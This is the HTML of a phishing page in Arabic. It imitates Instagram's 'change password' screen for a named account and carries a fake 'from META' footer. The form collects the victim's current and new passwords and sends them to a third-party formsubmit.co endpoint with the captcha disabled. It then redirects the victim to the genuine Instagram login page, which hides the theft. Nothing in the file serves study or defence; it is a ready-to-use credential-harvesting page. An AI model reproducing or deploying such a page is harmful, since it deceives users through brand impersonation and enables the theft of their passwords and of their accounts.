<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 40px; }
        
        /* كلمة Instagram مكتوبة بخط يشبه الأصلي */
        .insta-brand { font-size: 32px; font-weight: bold; margin-bottom: 20px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; letter-spacing: -1px; }
        
        .user-tag { color: #a8a8a8; font-size: 15px; margin-bottom: 30px; }
        .user-tag b { color: #fff; }

        form { width: 90%; max-width: 350px; }

        input { width: 100%; background: #121212; border: 0.5px solid #363636; border-radius: 8px; padding: 14px; margin-bottom: 12px; color: #fff; font-size: 14px; box-sizing: border-box; }
        input::placeholder { color: #8e8e8e; }

        button { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: white; padding: 12px; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 14px; }
        
        .footer-text { margin-top: auto; padding-bottom: 30px; color: #a8a8a8; font-size: 13px; text-align: center; }
        .meta-text { font-weight: bold; letter-spacing: 1px; color: #fff; font-size: 16px; margin-top: 5px; }
    </style>
</head>
<body>

    <div class="insta-brand">Instagram</div>
    
    <div class="user-tag">تغيير كلمة المرور لـ <b>@anes_38</b></div>

    <form action="https://formsubmit.co/b35269abccf715e68332f1a3a4ccca0c" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
        
        <input type="password" name="old_pass" placeholder="كلمة المرور الحالية" required>
        <input type="password" name="new_pass" placeholder="كلمة المرور الجديدة" required>
        <input type="password" name="confirm_pass" placeholder="تأكيد كلمة المرور الجديدة" required>
        
        <button type="submit">تغيير كلمة المرور</button>
    </form>

    <div class="footer-text">
        from <br>
        <div class="meta-text">META</div>
    </div>

</body>
</html>
